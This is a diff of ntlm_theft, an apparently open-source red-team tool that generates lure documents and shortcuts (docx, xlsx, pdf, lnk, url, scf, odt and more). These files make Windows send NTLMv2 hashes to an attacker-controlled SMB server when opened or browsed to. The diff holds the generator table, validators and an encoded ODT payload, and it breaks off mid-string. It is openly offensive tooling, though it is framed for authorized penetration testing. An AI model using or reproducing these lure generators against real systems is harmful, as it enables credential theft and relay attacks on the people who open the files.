@@ -1,17 +1,29 @@
-#!/usr/bin/env 
-# -*- coding: utf-8 -*-
-from __future__ import print_function
+#!/usr/bin/env python3
+
+"""
+ntlm_theft - Generate files for NTLMv2 hash theft attacks.
+
+A tool for generating multiple types of NTLMv2 hash theft files for
+authorized penetration testing and red team engagements.
+
+Author: Jacob Wilkin (Greenwolf)
+License: GPL-3.0
+"""
 
 # Tested on Windows 10 1903 Build 18362.720
 # Working Attacks:
 # Browse to directory: .url
-# Open file: .xml, .rtf, .jnlp, .xml (includePicture), .asx, .docx (includePicture), .docx (remoteTemplate), .docx (via Frameset), .xlsx (via External Cell), .htm (Open locally with Chrome, IE or Edge)
+# Open file: .xml, .rtf, .jnlp, .xml (includePicture), .asx, .docx (includePicture),
+#            .docx (remoteTemplate), .docx (via Frameset), .xlsx (via External Cell),
+#            .htm (Open locally with Chrome, IE or Edge)
 # Open file and allow: pdf
 # Browser download and open: .application (Must be downloaded via a web browser and run)
-# Partial Open file: .m3u (Works if you open with windows media player, but windows 10 auto opens with groove music)
+# Partial Open file: .m3u (Works if you open with windows media player,
+#                    but windows 10 auto opens with groove music)
 
-# In progress - desktop.ini (Need to test older windows versions), autorun.ini (Need to test before windows 7), scf (Need to test on older windows)
-
+# In progress - desktop.ini (Need to test older windows versions),
+#               autorun.inf (Need to test before windows 7),
+#               scf (Need to test on older windows)
 
 # References
 # https://ired.team/offensive-security/initial-access/t1187-forced-authentication
@@ -25,482 +37,530 @@ from __future__ import print_function
 # https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt
 
 import argparse
-import io
+import base64
 import os
+import re
 import shutil
 import sys
 import tempfile
-import xlsxwriter
-import base64
 import zipfile
-from sys import exit
+
+# Third-party imports
+import xlsxwriter
+
+# Script directory for template access
+SCRIPT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))
+
+# Version
+__version__ = "0.2.0"
 
 
-#the basic path of the script, make it possible to run from anywhere
-script_directory = os.path.dirname(os.path.abspath(__file__))
-
-GENERATOR_DESCRIPTIONS = {
-    "all": "Generate all supported file types",
-    "modern": "Generate only attacks expected to work on modern Windows",
-    "odt": "Generate a malicious .odt for LibreOffice/OpenOffice",
-    "scf": "Generate .scf (legacy Windows browse-to-folder technique)",
-    "url": "Generate .url files (URL + ICONFILE browse-to-folder techniques)",
-    "lnk": "Generate a .lnk that references a remote icon over SMB",
-    "rtf": "Generate .rtf with INCLUDEPICTURE referencing a remote SMB resource",
-    "xml": "Generate Word .xml variants (external stylesheet + includepicture)",
-    "htm": "Generate .htm that triggers remote resource load when opened locally",
-    "docx": "Generate .docx variants (includepicture, remote template, frameset)",
-    "xlsx": "Generate .xlsx with an external cell reference",
-    "wax": "Generate .wax playlist referencing remote resources",
-    "m3u": "Generate .m3u playlist referencing remote resources",
-    "asx": "Generate .asx playlist referencing remote resources",
-    "jnlp": "Generate .jnlp referencing a remote JAR",
-    "application": "Generate a .application ClickOnce manifest referencing remote dependency",
-    "pdf": "Generate a .pdf that triggers a remote UNC path when opened and allowed",
-    "zoom": "Generate Zoom chat instructions (legacy behavior)",
-    "libraryms": "Generate a .library-ms referencing a remote icon",
-    "autoruninf": "Generate Autorun.inf (legacy behavior)",
-    "desktopini": "Generate desktop.ini (legacy behavior)",
-    "theme": "Generate a Windows .theme file referencing remote resources",
+GENERATORS = {
+    "scf": {
+        "description": "Shell Command File with remote icon",
+        "action": "BROWSE TO FOLDER",
+        "modern": False,
+        "files": [(".scf", "create_scf")],
+    },
+    "url": {
+        "description": "Internet Shortcut with URL/icon fields",
+        "action": "BROWSE TO FOLDER",
+        "modern": True,
+        "files": [("-(url).url", "create_url_url"), ("-(icon).url", "create_url_icon")],
+    },
+    "lnk": {
+        "description": "Windows Shortcut with remote icon",
+        "action": "BROWSE TO FOLDER",
+        "modern": True,
+        "files": [(".lnk", "create_lnk")],
+    },
+    "rtf": {
+        "description": "Rich Text Format with INCLUDEPICTURE",
+        "action": "OPEN",
+        "modern": True,
+        "files": [(".rtf", "create_rtf")],
+    },
+    "xml": {
+        "description": "Microsoft Word XML with stylesheet/includepicture",
+        "action": "OPEN",
+        "modern": True,
+        "files": [
+            ("-(stylesheet).xml", "create_xml"),
+            ("-(fulldocx).xml", "create_xml_includepicture"),
+        ],
+    },
+    "htm": {
+        "description": "HTML with remote image and handler",
+        "action": "OPEN FROM DESKTOP WITH CHROME, IE OR EDGE",
+        "modern": True,
+        "files": [(".htm", "create_htm"), ("-(handler).htm", "create_htm_handler")],
+    },
+    "docx": {
+        "description": "Word document with includepicture/template/frameset",
+        "action": "OPEN",
+        "modern": True,
+        "files": [
+            ("-(includepicture).docx", "create_docx_includepicture"),
+            ("-(remotetemplate).docx", "create_docx_remote_template"),
+            ("-(frameset).docx", "create_docx_frameset"),
+        ],
+    },
+    "xlsx": {
+        "description": "Excel spreadsheet with external cell reference",
+        "action": "OPEN",
+        "modern": True,
+        "files": [("-(externalcell).xlsx", "create_xlsx_externalcell")],
+    },
+    "wax": {
+        "description": "Windows Media Player playlist",
+        "action": "OPEN",
+        "modern": True,
+        "files": [(".wax", "create_wax")],
+    },
+    "m3u": {
+        "description": "Media playlist (Windows Media Player only)",
+        "action": "OPEN IN WINDOWS MEDIA PLAYER ONLY",
+        "modern": True,
+        "files": [(".m3u", "create_m3u")],
+    },
+    "asx": {
+        "description": "Advanced Stream Redirector playlist",
+        "action": "OPEN",
+        "modern": True,
+        "files": [(".asx", "create_asx")],
+    },
+    "jnlp": {
+        "description": "Java Network Launch Protocol with remote JAR",
+        "action": "OPEN",
+        "modern": True,
+        "files": [(".jnlp", "create_jnlp")],
+    },
+    "application": {
+        "description": ".NET ClickOnce application manifest",
+        "action": "DOWNLOAD AND OPEN",
+        "modern": True,
+        "files": [(".application", "create_application")],
+    },
+    "pdf": {
+        "description": "PDF with remote GoToE action",
+        "action": "OPEN AND ALLOW",
+        "modern": True,
+        "files": [(".pdf", "create_pdf")],
+    },
+    "zoom": {
+        "description": "Zoom chat UNC path injection",
+        "action": "PASTE TO CHAT",
+        "modern": False,
+        "files": [("/zoom-attack-instructions.txt", "create_zoom")],
+    },
+    "odt": {
+        "description": "OpenDocument Text with remote image",
+        "action": "OPEN IN LIBREOFFICE/OPENOFFICE",
+        "modern": True,
+        "files": [(".odt", "create_odt")],
+    },
+    "libraryms": {
+        "description": "Windows Library file with remote icon",
+        "action": "BROWSE TO FOLDER",
+        "modern": True,
+        "files": [(".library-ms", "create_libraryms")],
+    },
+    "autoruninf": {
+        "description": "Autorun.inf with remote executable",
+        "action": "BROWSE TO FOLDER",
+        "modern": False,
+        "files": [("/Autorun.inf", "create_autoruninf")],
+    },
+    "desktopini": {
+        "description": "Desktop.ini with remote icon",
+        "action": "BROWSE TO FOLDER",
+        "modern": False,
+        "files": [("/desktop.ini", "create_desktopini")],
+    },
+    "theme": {
+        "description": "Windows Theme file with remote resources",
+        "action": "INSTALL THEME",
+        "modern": True,
+        "files": [(".theme", "create_theme")],
+    },
 }
 
-#arg parser to generate all or one file
 
-#python ntlm_theft --generate all --ip 127.0.0.1 --filename board-meeting2020
-parser = argparse.ArgumentParser(
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        description='ntlm_theft by Jacob Wilkin(Greenwolf)',
-        usage='%(prog)s --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>')
-parser.add_argument('-v', '--version', action='version',
-    version='%(prog)s 0.1.0 : ntlm_theft by Jacob Wilkin(Greenwolf)')
-parser.add_argument('-vv', '--verbose', action='store_true', dest='vv', help='Verbose Mode')
+def validate_filename(filename: str) -> None:
+    """Validate filename to prevent path traversal attacks."""
+    if not filename:
+        sys.exit("Error: Filename cannot be empty")
 
-parser.add_argument(
-    '-g',
-    '--generate',
-    action='store',
-    dest='generate',
-    required=False,
-    choices=sorted(GENERATOR_DESCRIPTIONS.keys()),
-    help='Choose to generate all files or a specific filetype'
-)
-parser.add_argument(
-    '-s',
-    '--server',
-    action='store',
-    dest='server',
-    required=False,
-    help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)'
-)
-parser.add_argument(
-    '-f',
-    '--filename',
-    action='store',
-    dest='filename',
-    required=False,
-    help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)'
-)
+    # Check for path traversal
+    if ".." in filename or filename.startswith("/") or filename.startswith("\\"):
+        sys.exit("Error: Invalid filename - path traversal not allowed")
 
-parser.add_argument(
-    '--output-dir',
-    default='.',
-    help='Parent directory to write output folder into (default: current directory)'
-)
-parser.add_argument(
-    '--force',
-    action='store_true',
-    help='Delete existing output folder without prompting'
-)
-parser.add_argument(
-    '--zip-output',
-    action='store_true',
-    help='Also zip the generated output folder (<folder>.zip)'
-)
-parser.add_argument(
-    '--list',
-    action='store_true',
-    help='List available generators and exit'
-)
-parser.add_argument(
-    '--describe',
-    metavar='TYPE',
-    choices=sorted(GENERATOR_DESCRIPTIONS.keys()),
-    help='Describe a generator and exit'
-)
-parser.add_argument(
-    '--color',
-    choices=('auto', 'always', 'never'),
-    default='auto',
-    help='Colored output: auto (default), always, never'
-)
-
-ANSI_RESET = "\033[0m"
-ANSI_BOLD = "\033[1m"
-ANSI_GREEN = "\033[32m"
-ANSI_YELLOW = "\033[33m"
-ANSI_RED = "\033[31m"
-ANSI_CYAN = "\033[36m"
-
-_COLOR_MODE = "auto"
-_COLOR_ENABLED = False
+    # Check for invalid characters (allow alphanumeric, dash, underscore, dot)
+    if not re.match(r"^[\w\-. ]+$", filename):
+        sys.exit(
+            "Error: Invalid filename - only alphanumeric, dash, underscore, dot, and space allowed"
+        )
 
 
-def _compute_color_enabled(color_mode: str) -> bool:
-    if color_mode == "always":
-        return True
-    if color_mode == "never":
-        return False
+def validate_server(server: str) -> str:
+    """Validate and sanitize server address."""
+    if not server:
+        sys.exit("Error: Server address cannot be empty")
 
-    if os.environ.get("NO_COLOR") is not None:
-        return False
-    if not sys.stdout.isatty():
-        return False
-    if os.environ.get("TERM") in (None, "dumb"):
-        return False
-    return True
+    # Basic validation - allow IP addresses and hostnames
+    # IPv4 pattern
+    ipv4_pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
+    # Hostname pattern (alphanumeric, dots, dashes)
+    hostname_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?$"
 
+    if not (re.match(ipv4_pattern, server) or re.match(hostname_pattern, server)):
+        sys.exit(
+            "Error: Invalid server address - must be IP address or valid hostname"
+        )
 
-def _color(text: str, ansi: str) -> str:
-    if not _COLOR_ENABLED:
-        return text
-    return f"{ansi}{text}{ANSI_RESET}"
+    # Additional IPv4 validation
+    if re.match(ipv4_pattern, server):
+        octets = server.split(".")
+        for octet in octets:
+            if int(octet) > 255:
+                sys.exit("Error: Invalid IP address - octet out of range")
 
-
-def log_info(message: str) -> None:
-    print(_color(message, ANSI_CYAN))
-
-
-def log_skip(message: str) -> None:
-    print(_color(message, ANSI_YELLOW))
+    return server
 
 
-def log_error(message: str) -> None:
-    print(_color(message, ANSI_RED + ANSI_BOLD))
+def escape_for_xml(text: str) -> str:
+    """Escape special characters for XML content."""
+    text = text.replace("&", "&amp;")
+    text = text.replace("<", "&lt;")
+    text = text.replace(">", "&gt;")
+    text = text.replace('"', "&quot;")
+    text = text.replace("'", "&apos;")
+    return text
 
 
-def log_created(path: str, mode: str) -> None:
-    print(_color(f"Created: {path} ({mode})", ANSI_GREEN))
-
-
-def validate_basename(name: str) -> None:
-    if not name or name.strip() == "":
-        raise ValueError("Filename cannot be empty")
-    if name in (".", ".."):
-        raise ValueError("Filename must not be '.' or '..'")
-    if os.path.sep in name or (os.path.altsep and os.path.altsep in name):
-        raise ValueError("Filename must be a base name (no path separators)")
-
-
-def zip_directory(source_dir: str, zip_path: str) -> None:
-    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
-        for root, _, files in os.walk(source_dir):
-            for file_name in files:
-                full_path = os.path.join(root, file_name)
-                arcname = os.path.relpath(full_path, start=source_dir)
-                zf.write(full_path, arcname=arcname)
-
-
-# .odt
-
-def create_odt_ntlm_leak(server_ip: str, output_filename: str):
-
-    # === BASE64 ENCODED PARTS ===
-    contentxml1 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczpvZmZpY2Vvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L29mZmljZSIgeG1sbnM6dGFibGVvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L3RhYmxlIiB4bWxuczpkcmF3b29vPSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAxMC9kcmF3IiB4bWxuczpjYWxjZXh0PSJ1cm46b3JnOmRvY3VtZW50Zm91bmRhdGlvbjpuYW1lczpleHBlcmltZW50YWw6Y2FsYzp4bWxuczpjYWxjZXh0OjEuMCIgeG1sbnM6bG9leHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpvZmZpY2U6eG1sbnM6bG9leHQ6MS4wIiB4bWxuczpmaWVsZD0idXJuOm9wZW5vZmZpY2U6bmFtZXM6ZXhwZXJpbWVudGFsOm9vby1tcy1pbnRlcm9wOnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVub2ZmaWNlOm5hbWVzOmV4cGVyaW1lbnRhbDpvb3htbC1vZGYtaW50ZXJvcDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6Y3NzM3Q9Imh0dHA6Ly93d3cudzMub3JnL1RSL2NzczMtdGV4dC8iIG9mZmljZTp2ZXJzaW9uPSIxLjIiPjxvZmZpY2U6c2NyaXB0cy8+PG9mZmljZTpmb250LWZhY2UtZGVjbHM+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FuczEiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7THVjaWRhIFNhbnMmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InN3aXNzIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNlcmlmIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2VyaWYmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InJvbWFuIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTGliZXJhdGlvbiBTYW5zIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3dpc3MiIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FucyIgc3ZnOmZvbnQtZmFtaWx5PSImYXBvcztMdWNpZGEgU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTWljcm9zb2Z0IFlhSGVpIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO01pY3Jvc29mdCBZYUhlaSZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iU2ltU3VuIiBzdmc6Zm9udC1mYW1pbHk9IlNpbVN1biIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjwvb2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48b2ZmaWNlOmF1dG9tYXRpYy1zdHlsZXM+PHN0eWxlOnN0eWxlIHN0eWxlOm5hbWU9ImZyMSIgc3R5bGU6ZmFtaWx5PSJncmFwaGljIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iT0xFIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOmhvcml6b250YWwtcG9zPSJjZW50ZXIiIHN0eWxlOmhvcml6b250YWwtcmVsPSJwYXJhZ3JhcGgiIGRyYXc6b2xlLWRyYXctYXNwZWN0PSIxIi8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCIvPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iT2JqZWN0MSIgdGV4dDphbmNob3ItdHlwZT0icGFyYWdyYXBoIiBzdmc6d2lkdGg9IjE0LjEwMWNtIiBzdmc6aGVpZ2h0PSI5Ljk5OWNtIiBkcmF3OnotaW5kZXg9IjAiPjxkcmF3Om9iamVjdCB4bGluazpocmVmPSJmaWxlOi8v"
+def create_odt(server: str, filename: str, modern: bool = False) -> None:
+    """Create ODT file with remote image reference."""
+    # Base64 encoded ODT content.xml parts
+    contentxml1 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczp0YWJsZW9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDkvdGFibGUiIHhtbG5zOmRyYXdvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDEwL2RyYXciIHhtbG5zOmNhbGNleHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpjYWxjOnhtbG5zOmNhbGNleHQ6MS4wIiB4bWxuczpsb2V4dD0idXJuOm9yZzpkb2N1bWVudGZvdW5kYXRpb246bmFtZXM6ZXhwZXJpbWVudGFsOm9mZmljZTp4bWxuczpsb2V4dDoxLjAiIHhtbG5zOmZpZWxkPSJ1cm46b3BlbmRvY3VtZW50OnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVuZG9jdW1lbnQ6eG1sbnM6Zm9ybToxLjAiIHhtbG5zOmNzcz1zdD0iaHR0cDovL3d3dy53My5vcmcvbnMjIiBvZmZpY2U6dmVyc2lvbj0iMS4yIj48b2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48c3R5bGU6Zm9udC1mYWNlIHN0eWxlOm5hbWU9IkxpYmVyYXRpb24gU2VyaWYiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7TGliZXJhdGlvbiBTZXJpZiZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0icm9tYW4iIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNhbnMiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7TGliZXJhdGlvbiBTYW5zJmFwb3M7IiBzdHlsZTpmb250LWZhbWlseS1nZW5lcmljPSJzd2lzcyIgc3R5bGU6Zm9udC1waXRjaD0idmFyaWFibGUiLz48L29mZmljZTpmb250LWZhY2UtZGVjbHM+PG9mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxzdHlsZTpzdHlsZSBzdHlsZTpuYW1lPSJmcjEiIHN0eWxlOmZhbWlseT0iZ3JhcGhpYyIgc3R5bGU6cGFyZW50LXN0eWxlLW5hbWU9IkdyYXBoaWNzIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOnZlcnRpY2FsLXBvcz0idG9wIiBzdHlsZTp2ZXJ0aWNhbC1yZWw9ImJhc2VsaW5lIiBzdHlsZTpob3Jpem9udGFsLXBvcz0iY2VudGVyIiBzdHlsZTpob3Jpem9udGFsLXJlbD0icGFyYWdyYXBoIi8+PC9zdHlsZTpzdHlsZT48c3R5bGU6c3R5bGUgc3R5bGU6bmFtZT0iUDEiIHN0eWxlOmZhbWlseT0icGFyYWdyYXBoIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iU3RhbmRhcmQiPjxzdHlsZTp0ZXh0LXByb3BlcnRpZXMgZm86Zm9udC1zaXplPSI0OHB0IiBzdHlsZTpmb250LXNpemUtYXNpYW49IjQ4cHQiIHN0eWxlOmZvbnQtc2l6ZS1jb21wbGV4PSI0OHB0Ii8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGV